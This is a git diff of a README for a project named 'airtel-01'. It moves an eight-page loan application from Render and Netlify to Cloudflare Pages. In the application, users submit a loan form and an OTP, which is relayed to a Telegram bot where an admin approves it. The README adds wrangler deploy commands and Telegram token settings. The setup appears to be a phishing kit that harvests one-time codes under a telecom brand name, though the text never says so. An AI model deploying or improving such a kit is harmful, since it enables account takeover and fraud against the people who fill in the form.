@@ -8,9 +8,9 @@ Complete setup for the loan application with Node.js backend and Telegram bot ve
 
 ```
 ✅ Frontend: 8 HTML pages (index → loan7)
-✅ Backend: Node.js/Express server
+✅ Backend: Cloudflare Pages API functions
 ✅ Telegram: Admin approval for OTP
-✅ Deployment: Render (backend) + Netlify (frontend)
+✅ Deployment: Cloudflare Pages fullstack
 ```
 
 ---
@@ -119,28 +119,38 @@ git remote add origin https://github.com/YOUR_USERNAME/airtel-01.git
 git push -u origin main
 ```
 
-### Step 2: Deploy Backend on Render
+### Step 2: Deploy Fullstack on Cloudflare Pages
 
-1. Go to [render.com](https://render.com)
-2. Click **New +** → **Web Service**
-3. **Connect GitHub** and select your repo
-4. Fill in:
-   - **Name**: `airtel-01-backend`
-   - **Root Directory**: `backend`
-   - **Build Command**: `npm install`
-   - **Start Command**: `npm start`
-5. **Advanced** → **Environment Variables**:
-   - Add all from your `.env` file
-   - Change `BACKEND_URL=https://airtel-01.onrender.com`
-6. Click **Deploy**
+1. Install Wrangler:
 
-### Step 3: Deploy Frontend on Netlify
+```bash
+npm install -g wrangler
+```
 
-1. Go to [netlify.com](https://netlify.com)
-2. Click **Add new site** → **Import existing project**
-3. **Connect GitHub** and select your repo
-4. Click **Deploy site**
-5. ✅ Frontend URL: `https://your-site.netlify.app`
+2. Authenticate:
+
+```bash
+wrangler login
+```
+
+3. Verify `wrangler.toml` is in project root and contains API function config.
+
+4. Deploy:
+
+```bash
+wrangler pages deploy ./ --branch=main --project-name=inbucks-fullstack
+```
+
+5. Set Pages environment variables:
+
+- `TELEGRAM_BOT_TOKEN`
+- `TELEGRAM_ADMIN_CHAT_ID`
+- `TELEGRAM_CALLBACK_TOKEN`
+
+6. Confirm URLs:
+
+- `https://<your-pages>.pages.dev`
+- `https://<your-pages>.pages.dev/api/health`
 
 ### Step 4: Connect Frontend to Backend
 
@@ -152,7 +162,7 @@ In `index.html` (after `<body>` opening tag), add:
   const isDevelopment = window.location.hostname === "localhost";
   const backendUrl = isDevelopment
     ? "http://localhost:3000"
-    : "https://airtel-01.onrender.com"; // change to the URL for your Render service
+    : "https://<your-pages>.pages.dev";
   localStorage.setItem("backendUrl", backendUrl);
 </script>
 ```
@@ -161,7 +171,7 @@ Or for each page that uses the backend, add:
 
 ```html
 <script>
-  localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
+  localStorage.setItem("backendUrl", "https://<your-pages>.pages.dev");
 </script>
 ```
 
@@ -169,7 +179,7 @@ Or for each page that uses the backend, add:
 
 ## 🔍 Testing Production
 
-1. Visit your Netlify frontend URL
+1. Visit your Cloudflare Pages frontend URL
 2. Complete loan form
 3. Enter OTP (e.g., `12345`)
 4. Submit → Should reach verification screen
@@ -185,8 +195,8 @@ Or for each page that uses the backend, add:
 | ----------------------------- | -------------------------------------------------------- |
 | OTP submission error          | Backend URL incorrect in localStorage                    |
 | Bot not sending message       | Check `TELEGRAM_BOT_TOKEN` and `TELEGRAM_ADMIN_CHAT_ID`  |
-| CORS error                    | Render backend needs CORS enabled (already done)         |
-| Stuck on verification         | Backend might be asleep (Render free tier) - wait 30s    |
+| CORS error                    | Ensure frontend uses valid Pages URL and CORS policy     |
+| Stuck on verification         | Backend might be asleep (Pages cold start) - wait 30s    |
 | Can't find request on approve | Check request ID matches between submit and status check |
 
 ---
@@ -243,7 +253,7 @@ Frontend detects approval → Redirects to loan7.html (Success!)
 
 - **Never** commit `.env` file to GitHub
 - **Always** use environment variables for secrets
-- **Always** use HTTPS in production (Render/Netlify handle this)
+- **Always** use HTTPS in production (Cloudflare Pages handles this)
 - Add rate limiting to backend for production
 - Validate all inputs on backend
 - Use HTTPS for local testing with ngrok if needed
@@ -252,12 +262,11 @@ Frontend detects approval → Redirects to loan7.html (Success!)
 
 ## 💡 Next Steps
 
-1. ✅ Deploy backend on Render
-2. ✅ Deploy frontend on Netlify
-3. ✅ Get Telegram bot token & chat ID
-4. ✅ Configure environment variables
-5. 📋 Test complete flow
-6. 🎉 Go live!
+1. ✅ Deploy fullstack on Cloudflare Pages
+2. ✅ Configure Telegram bot token & chat ID
+3. ✅ Configure environment variables in Pages
+4. 📋 Test complete flow
+5. 🎉 Go live!
 
 For more details, see [DEPLOYMENT.md](./DEPLOYMENT.md)
 
@@ -268,7 +277,6 @@ For more details, see [DEPLOYMENT.md](./DEPLOYMENT.md)
 - Backend docs: See `backend/README.md`
 - Deployment: See `DEPLOYMENT.md`
 - Telegram bot API: https://core.telegram.org/bots/api
-- Render docs: https://render.com/docs
-- Netlify docs: https://docs.netlify.com
+- Cloudflare Pages docs: https://developers.cloudflare.com/pages
 
 Happy deploying! 🚀
